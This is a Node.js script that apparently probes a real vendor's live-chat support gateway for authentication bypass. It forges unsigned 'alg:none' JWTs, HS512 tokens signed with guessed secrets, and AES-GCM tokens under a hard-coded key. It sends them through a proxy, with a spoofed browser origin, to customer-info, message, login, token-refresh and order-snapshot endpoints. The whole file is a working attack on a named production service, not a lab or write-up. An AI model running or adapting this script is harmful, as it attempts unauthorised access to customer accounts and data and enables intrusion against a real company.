const crypto=require('crypto');
const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://oepa.bblops.com/csm/gateway';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const b64u=(o)=>Buffer.from(JSON.stringify(o)).toString('base64url');
const cusId='1234567890123456789';
const exp=Math.floor(Date.now()/1000)+3600;
function jwtNone(payload){return b64u({alg:'none',typ:'JWT'})+'.'+b64u(payload)+'.';}
function jwtHS(payload,secret){const h=b64u({alg:'HS512',typ:'JWT'}),p=b64u(payload);const sig=crypto.createHmac('sha512',secret).update(h+'.'+p).digest('base64url');return h+'.'+p+'.'+sig;}
const key=Buffer.from('5WIuvjCRLf8DyALsXGhbUfvlvLf1xt043I02_YGmPOY','base64url');
function aesToken(plain){const iv=crypto.randomBytes(12);const c=crypto.createCipheriv('aes-256-gcm',key,iv);const ct=Buffer.concat([c.update(plain,'utf8'),c.final()]);const tag=c.getAuthTag();return Buffer.concat([iv,ct,tag]).toString('base64url');}
async function req(method,path,body,headers,label){try{const r=await fetch(B+path,{method,headers:{'user-agent':UA,origin:'https://support.bambulab.com',referer:'https://support.bambulab.com/liveChat','content-type':'application/json',...headers},body:body===undefined?undefined:JSON.stringify(body),dispatcher:d,signal:AbortSignal.timeout(20000)});const t=await r.text();console.log(r.status,label,'|',t.slice(0,220).replace(/\s+/g,' '));}catch(e){console.log('ERR',label,e.message)}}
(async()=>{
 const payload={cusId,name:'test',email:'test@example.com',phone:'10000000000',exp,iat:Math.floor(Date.now()/1000)};
 const jn=jwtNone(payload), jnNoDot=jwtNone(payload).slice(0,-1), jh=jwtHS(payload,'secret'), jh2=jwtHS(payload,'bambulab');
 console.log('JWT none:',jn);
 for(const [name,tok] of [['none',jn],['none-no-dot',jnNoDot],['hs512-secret',jh],['hs512-bambulab',jh2]]){
  await req('GET','/cus/auth/cusInfo',undefined,{authorization:'Bearer '+tok},'cusInfo '+name);
  await req('POST','/cus/message/page',{cursor:'',limit:1},{authorization:'Bearer '+tok},'message/page '+name);
  await req('POST','/cus/auth/ticket/login',{ticket:tok}, {},'ticket-login '+name);
  await req('POST','/cus/auth/token/refresh',{refreshToken:tok},{},'refresh '+name);
  await req('POST','/cus/auth/bbl-token/login',undefined,{bbl_token:'Bearer '+tok},'bbl-login '+name);
 }
 const forged=aesToken(jn+'|'+(Date.now()+3600000));
 console.log('forged bblToken len',forged.length);
 await req('POST','/cus/auth/bbl-token/login',undefined,{bbl_token:'Bearer '+forged},'bbl-login forged-aes-none');
 await req('POST','/gw/robot/im/mall/card/snapshot',{cardType:'order',orderNo:'1'},{bbl_token:'Bearer '+forged,'x-robot-user':cusId},'mall-snapshot forged-aes-none');
 await req('POST','/cus/auth/bbl-token/login',undefined,{bbl_token:'Bearer '+aesToken('DUMMY|'+(Date.now()+3600000))},'bbl-login forged-aes-dummy');
})();
